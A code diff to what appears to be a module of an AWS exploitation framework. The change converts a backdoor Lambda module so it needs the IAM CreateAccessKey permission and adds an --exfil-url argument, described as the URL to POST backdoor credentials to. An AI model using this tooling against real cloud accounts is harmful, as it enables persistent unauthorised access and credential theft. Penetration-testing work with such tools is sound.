@@ -25,12 +25,11 @@ module_info = {
 
     'external_dependencies': [],
 
-    'arguments_to_autocomplete': ['--regions', '--ip-range', '--port-range', '--protocol', '--cleanup'],
+    'arguments_to_autocomplete': ['--exfil-url', '--cleanup'],
 }
 
 parser = argparse.ArgumentParser(add_help=False, description=module_info['description'])
 
-parser.add_argument('--regions', required=False, default=None, help='One or more (comma separated) AWS regions to create the backdoor Lambda function in, in the format "us-east-1". Defaults to all session regions.')
 parser.add_argument('--exfil-url', required=False, default=None, help='The URL to POST backdoor credentials to, so you can access them.')
 parser.add_argument('--cleanup', required=False, default=False, action='store_true', help='Run the module in cleanup mode. This will remove any known backdoors that the module added from the account.')
 
@@ -120,7 +119,7 @@ def main(args, pacu_main):
 
     created_resources = {'LambdaFunctions': [], 'CWERules': []}
 
-    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the EC2 AuthorizeSecurityGroupIngress permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
+    target_role_arn = input('  What role should be used? Note: The role should allow Lambda to assume it and have at least the IAM CreateAccessKey permission. Enter the ARN now or just press enter to enumerate a list of possible roles to choose from: ')
     if not target_role_arn:
         if fetch_data(['IAM', 'Roles'], module_info['prerequisite_modules'][0], '--roles', force=True) is False:
             print('Pre-req module not run successfully. Exiting...')
@@ -223,7 +222,7 @@ def main(args, pacu_main):
         with open('./modules/{}/created-cloudwatch-events-rules.txt'.format(module_info['name']), 'w+') as f:
             f.write('\n'.join(created_resources['CWERules']))
 
-    print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-west-1.')
+    print('Warning: Your backdoor will not execute if the account does not have an active CloudTrail trail in us-east-1.')
 
     return data
 
